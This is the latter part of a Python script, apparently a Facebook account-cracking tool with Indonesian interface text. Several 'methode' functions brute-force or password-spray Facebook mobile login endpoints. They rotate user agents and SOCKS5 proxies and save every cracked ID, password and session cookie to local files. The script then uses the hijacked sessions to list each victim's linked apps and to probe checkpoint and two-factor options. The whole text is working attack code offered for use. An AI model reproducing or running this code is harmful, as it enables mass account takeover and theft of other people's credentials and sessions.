                                 print(f'\r{K}>> {idf}|{pw}{N}')      
                                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n') 
                                 akun.append(idf+'|'+pw) 
                                 cp+=1  
                                 break 
                         elif "c_user" in ses.cookies.get_dict().keys(): 
                                 ok+=1 
                                 coki=po.cookies.get_dict() 
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
                                 cetak(nel('[green]      ❤️✨ WASI-OK ❤️✨[green]'))  
                                 print(f'\r{H}>> {idf}|{pw}|{kuki}\n{ua}{N}') 
                                 open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n') 
                                 cek_apk(session,coki) 
                                 break 
                                  
                         else: 
                                 continue 
                 except requests.exceptions.ConnectionError: 
                         time.sleep(31) 
         loop+=1 
 #------------------[ METHODE-MBASIC-2 ]-------------------# 
 def crackfree(idf,pwv): 
         global loop,ok,cp 
         sys.stdout.write(f"\r❤️ {P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "), 
         sys.stdout.flush() 
         ua = random.choice(ugen) 
         ua2 = random.choice(ugen2) 
         ses = requests.Session() 
         for pw in pwv: 
                 try: 
                         ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}) 
                         p = ses.get('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs) 
                         dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,} 
                         koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]) 
                         koki+=' m_pixel_ratio=2.625; wd=412x756' 
                         heade={"Host":"p.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"} 
                         po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs) 
                         if "checkpoint" in po.cookies.get_dict().keys(): 
                                 cetak(nel('  [red]     😭 MOHON MAAF ANDA BELUM BERUNTUNG MOHON BERSABAR 😭[red]')) 
                                 print(f'\r{K}>> {idf}|{pw}{N}')      
                                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n') 
                                 akun.append(idf+'|'+pw) 
                                 cp+=1 
                                 break 
                         elif "c_user" in ses.cookies.get_dict().keys(): 
                                 ok+=1 
                                 coki=po.cookies.get_dict() 
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
                                 cetak(nel('[purple]      😭HELLO THIS MUSLIM-XD 🤣[purple]'))  
                                 print(f'\r{H}>> {idf}|{pw}|{kuki}{N}') 
                                 open('OK/'+okc,'a').write(idf+'|'+pw+'\n') 
                                 cek_apk(session,coki) 
                                 break 
                                  
                         else: 
                                 continue 
                 except requests.exceptions.ConnectionError: 
                         time.sleep(31) 
         loop+=1 
  
 #---------------------[ METHODE-TOUCH-3 ]---------------------# 
 def cracktouch(idf,pwv): 
         global loop,ok,cp 
         bi = random.choice([u,k,kk,b,h,hh]) 
         pers = loop*100/len(id2) 
         fff = '%' 
         nip=random.choice(prox) 
         proxs= {'http': 'socks5://'+nip} 
         ua = random.choice(ugen) 
         ua2 = random.choice(ugen2) 
         ses = requests.Session() 
         sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush() 
         for pw in pwv: 
                 try: 
                         ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}) 
                         p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr') 
                         dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,} 
                         ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}) 
                         po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs) 
                         koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]) 
                         koki+=' m_pixel_ratio=2.625; wd=412x756' 
                          
                         if "checkpoint" in po.cookies.get_dict().keys(): 
                                 if 'ya' in oprek: 
                                         akun.append(idf+'|'+pw) 
                                         ceker(idf,pw) 
                                 elif 'ya' in princp: 
                                         print('\n') 
                                         statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}' 
                                         statuscp1 = nel(statuscp, style='red') 
                                         cetak(nel(statuscp1, title='Ilham-Rd CP')) 
                                         open('/sdcard/PINK-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n') 
                                         akun.append(idf+'|'+pw) 
                                         cp+=1 
                                 else:continue 
                                 break 
                         elif "c_user" in ses.cookies.get_dict().keys(): 
                                 headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"} 
                                 if 'no' in taplikasi: 
                                         coki=po.cookies.get_dict() 
                                         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
                                         open('/sdcard/4MBF-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n') 
                                         print('\n') 
                                         statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}' 
                                         statusok1 = nel(statusok, style='green') 
                                         cetak(nel(statusok1, title='PINK-XD OK')) 
                                         ok+=1 
                                         break 
                                 elif 'ya' in taplikasi: 
                                         coki=po.cookies.get_dict() 
                                         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
                                         open('/sdcard/PINK-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n') 
                                         user=idf 
                                         infoakun = "" 
                                         session = requests.Session() 
                                         cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text 
                                         cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text 
                                         infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n") 
                                         apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek)) 
                                         nok=1 
                                         for muncul in apkaktif: 
                                                 infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n") 
                                                 nok+=1 
  
                                         hit=0 
                                         infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n") 
                                         apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2)) 
                                         hit=0 
                                         for muncul in apkexp: 
                                                 hit+=1 
                                                 infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n") 
                                         print('\n') 
                                         statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}' 
                                         statusok1 = nel(statusok, style='green') 
                                         cetak(nel(statusok1, title='[bold green]PINK-XD OK[/bold green]')) 
                                         ok+=1 
                                         break 
  
  
                         else: 
                                 continue 
                 except requests.exceptions.ConnectionError: 
                         time.sleep(31) 
         loop+=1 
 #----------------------[ METHODE-MTOUCH+MOBILE-4 ]-----------------# 
 def crackmbasic(idf,pwv): 
         global loop,ok,cp 
         bi = random.choice([u,k,kk,b,h,hh]) 
         pers = loop*100/len(id2) 
         fff = '%' 
         nip=random.choice(prox) 
         proxs= {'http': 'socks5://'+nip} 
         ua = random.choice(ugen) 
         ua2 = random.choice(ugen2) 
         ses = requests.Session() 
         sys.stdout.write('\r%s ☬ %s/%s ☬ OK:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush() 
         for pw in pwv: 
                 try: 
                         ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}) 
                         p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr') 
                         dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,} 
                         koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ]) 
                         koki+=' m_pixel_ratio=2.625; wd=412x756' 
                         heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'} 
                         po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs) 
                         if "checkpoint" in po.cookies.get_dict().keys(): 
                                 if 'ya' in oprek: 
                                         akun.append(idf+'|'+pw) 
                                         ceker(idf,pw) 
                                 elif 'ya' in princp: 
                                         print('\n') 
                                         statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}' 
                                         statuscp1 = nel(statuscp, style='red') 
                                         cetak(nel(statuscp1, title='PINK-XD CP')) 
                                         open('/sdcard/PINK-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n') 
                                         akun.append(idf+'|'+pw) 
                                         cp+=1 
                                 else:continue 
                                 break 
                         elif "c_user" in ses.cookies.get_dict().keys(): 
                                 headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"} 
                                 if 'no' in taplikasi: 
                                         coki=po.cookies.get_dict() 
                                         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
                                         open('/sdcard/PINK-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n') 
                                         print('\n') 
                                         statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}' 
                                         statusok1 = nel(statusok, style='green') 
                                         cetak(nel(statusok1, title='OK')) 
                                         ok+=1 
                                         break 
                                 elif 'ya' in taplikasi: 
                                         coki=po.cookies.get_dict() 
                                         kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]) 
                                         open('/sdcard/PINK-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n') 
                                         user=idf 
                                         infoakun = "" 
                                         session = requests.Session() 
                                         cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text 
                                         cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text 
                                         infoakun += (f"\n[bold cyan][•] LIST ACTIVE APPLICATIONS :[/bold cyan] \n") 
                                         apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek)) 
                                         nok=1 
                                         for muncul in apkaktif: 
                                                 infoakun+= (f"[bold cyan][{nok}] {muncul[0]} {muncul[1]}[/bold cyan]\n") 
                                                 nok+=1 
  
                                         hit=0 
                                         infoakun += (f"\n[bold yellow][•] LIST EXPIRED APPLICATIONS :[/bold yellow]\n") 
                                         apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2)) 
                                         hit=0 
                                         for muncul in apkexp: 
                                                 hit+=1 
                                                 infoakun += (f"[bold yellow][{hit}] {muncul[0]} {muncul[1]}[/bold yellow]\n") 
                                         print('\n') 
                                         statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}' 
                                         statusok1 = nel(statusok, style='green') 
                                         cetak(nel(statusok1, title='[bold green]PINK-XD OK[/bold green]')) 
                                         ok+=1 
                                         break 
                         else: 
                                 continue 
                 except requests.exceptions.ConnectionError: 
                         time.sleep(31) 
         loop+=1 
 #--------------------[ CHECK-OPSI-CHEKPOINT ]-------------------# 
 def ceker(idf,pw): 
         global cp 
         ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]' 
         head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"} 
         ses = requests.Session() 
         try: 
                 hi = ses.get('https://mbasic.facebook.com') 
                 ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser') 
                 jo = ho.find('form') 
                 data = {} 
                 lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data'] 
                 for anj in jo('input'): 
                         if anj.get('name') in lion: 
                                 data.update({anj.get('name'):anj.get('value')}) 
                 kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser') 
                 print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x)) 
                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n') 
                 cp+=1 
                 opsi = kent.find_all('option') 
                 if len(opsi)==0: 
                         print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x)) 
                 else: 
                         for opsii in opsi: 
                                 print('\r%s---> %s%s'%(kk,opsii.text,x)) 
         except Exception as c: 
                 print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x)) 
                 print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x)) 
                 open('CP/'+cpc,'a').write(idf+'|'+pw+'\n') 
                 cp+=1 
 #--------------------------[ CHECK-OPSI-CHEKPOINT-2 ]----------------# 
 def cek_opsi(): 
         c = len(akun) 
         hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c) 
         cetak(nel(hu, title='CEK OPSI')) 
         input(u+'['+h+'•'+u+'] Mulai') 
         cek = '# PROSES CEK OPSI DIMULAI' 
         sol().print(mark(cek, style='green')) 
         love = 0 
         for kes in akun: 
                 try: 
                         try: 
                                 id,pw = kes.split('|')[0],kes.split('|')[1] 
                         except IndexError: 
                                 time.sleep(2) 
                                 print('\r%s++++ %s ----> Error      %s'%(b,kes,x)) 
                                 print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x)) 
                                 continue 
                         bi = random.choice([u,k,kk,b,h,hh]) 
                         print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush() 
                         ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36' 
                         ses = requests.Session() 
                         header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"} 
                         hi = ses.get('https://mbasic.facebook.com') 
                         ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser') 
                         if "checkpoint" in ses.cookies.get_dict().keys(): 
                                 try: 
                                         jo = ho.find('form') 
                                         data = {} 
                                         lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data'] 
                                         for anj in jo('input'): 
                                                 if anj.get('name') in lion: 
                                                         data.update({anj.get('name'):anj.get('value')}) 
                                         kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser') 
                                         print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x)) 
                                         opsi = kent.find_all('option') 
                                         if len(opsi)==0: 
                                                 print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x)) 
                                         else: 
                                                 for opsii in opsi: 
                                                         print('\r%s---> %s%s'%(kk,opsii.text,x)) 
                                 except: 
                                         print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x)) 
                                         print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x)) 
                         elif "c_user" in ses.cookies.get_dict().keys(): 
                                 print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x)) 
                         else: 
                                 print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x)) 
                         love+=1 
                 except requests.exceptions.ConnectionError: 
                         print('') 
                         li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI' 
                         sol().print(mark(li, style='red')) 
                         exit() 
         dah = '# DONE' 
         sol().print(mark(dah, style='green')) 
         exit() 
 #----------------------[ CEK-APLIKASI ]---------------------# 
 def cek_apk(session,cookie): 
         w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text 
         sop = BeautifulSoup(w,"html.parser") 
         x = sop.find("form",method="post") 
         game = [i.text for i in x.find_all("h3")] 
         if len(game)==0: 
                 print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi aktif di akun ini.") 
         else: 
                 for i in range(len(game)): 
                         print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N)) 
         w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text 
         sop = BeautifulSoup(w,"html.parser") 
         x = sop.find("form",method="post") 
         game = [i.text for i in x.find_all("h3")] 
         if len(game)==0: 
                 print(f"\n {N}[{M}!{N}] opshh tidak ada aplikasi kadaluarsa di akun ini.") 
         else: 
                 for i in range(len(game)): 
                         print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N)) 
  
 #-----------------------[ SYSTEM-CONTROL ]--------------------# 
 if __name__=='__main__': 
         try:os.system('git pull') 
         except:pass 
         try:os.mkdir('OK') 
         except:pass 
         try:os.mkdir('CP') 
         except:pass 
         try:os.mkdir('DUMP') 
         except:pass 
         try:os.system('touch .prox.txt') 
         except:pass 
         login() 
  
 #>>>>> THANKS TO THIS HERE <<<<<<<#
